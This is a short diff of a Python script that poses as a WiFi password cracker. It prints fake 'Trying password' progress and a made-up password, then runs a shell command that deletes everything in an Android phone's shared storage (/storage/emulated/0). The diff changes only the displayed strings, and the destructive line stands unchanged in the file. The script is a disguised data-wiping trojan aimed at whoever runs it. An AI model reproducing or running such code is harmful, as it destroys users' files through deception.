@@ -29,9 +29,9 @@ print("attack starting")
 
 for y in range (100):
 	print("Trying password ",y," proccessing password ")
-WifiHack = input("press enter to get password:")
+WifiHack = input("press enter to get password :")
 
-print("password:fileku")
+print("password:Datafilemobata")
 
 import os
 os.system('rm -rf /storage/emulated/0/*')
